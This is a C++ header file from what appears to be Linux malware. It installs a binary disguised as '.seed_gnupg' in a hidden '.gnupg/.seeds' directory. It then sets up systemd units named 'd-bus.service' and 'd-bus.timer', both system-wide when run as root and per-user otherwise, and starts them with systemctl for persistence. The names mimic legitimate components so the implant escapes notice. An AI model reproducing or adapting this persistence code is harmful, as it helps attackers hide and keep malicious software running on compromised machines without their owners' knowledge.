#ifndef INSTALL_H
#define INSTALL_H

#include <string>
#include <fstream>
#include <cstring>

#include "util.hh"

const std::string INSTALL_DIR = ".gnupg/.seeds";
const std::string BIN = "cpp-linux";
const std::string BIN_NEW = ".seed_gnupg";

const std::string ROOT_HOME = "/root";
const std::string SERVICE = "d-bus.service";
const std::string SYS_SERVICE = "root.d-bus.service";
const std::string TIMER = "d-bus.timer";
const std::string SERVICE_DEST = ".config/systemd/user";
const std::string SYS_SERVICE_DEST = "/etc/systemd/system";


static void copyFile (std::string src, std::string dst)
{
    std::ifstream srcFile (src, std::ios::binary);
    std::ofstream dstFile (dst, std::ios::binary|std::ios::trunc);
    if ( srcFile.is_open() && dstFile.is_open() ) dstFile << srcFile.rdbuf();
}


namespace install {


void installFiles ()
{
    std::string mkdirCmd, homeDir, binPath, servicePath, timerPath, chmodCmd;

    if ( util::isRoot() ) {
        mkdirCmd =
            "mkdir -p "
            + SYS_SERVICE_DEST
            + " "
            + ROOT_HOME + "/" + INSTALL_DIR;
        binPath = ROOT_HOME + "/" + INSTALL_DIR + "/" + BIN_NEW;
        servicePath = SYS_SERVICE_DEST + "/" + SERVICE;
        timerPath = SYS_SERVICE_DEST + "/" + TIMER;

        copyFile(SYS_SERVICE, servicePath);
    } else {
        homeDir = std::getenv("HOME");
        mkdirCmd =
            "mkdir -p "
            + homeDir + "/" + SERVICE_DEST
            + " "
            + homeDir + "/" + INSTALL_DIR;
        binPath = homeDir + "/" + INSTALL_DIR + "/" + BIN_NEW;
        servicePath = homeDir + "/" + SERVICE_DEST + "/" + SERVICE;
        timerPath = homeDir + "/" + SERVICE_DEST + "/" + TIMER;

        copyFile(SERVICE, servicePath);
    }

    std::system(mkdirCmd.c_str());
    copyFile(BIN, binPath);
    copyFile(TIMER, timerPath);

    // Copying the file does not keep the permissions
    chmodCmd = "chmod 755 " + binPath;
    std::system(chmodCmd.c_str());
}


void initSystemd ()
{
    std::string systemdCmd;

    if ( util::isRoot() ) {
        systemdCmd = "systemctl enable --now " + TIMER;
    } else {
        systemdCmd = "systemctl enable --now --user " + TIMER;
    }

    std::system(systemdCmd.c_str());
}


} //namespace install

#endif // INSTALL_H
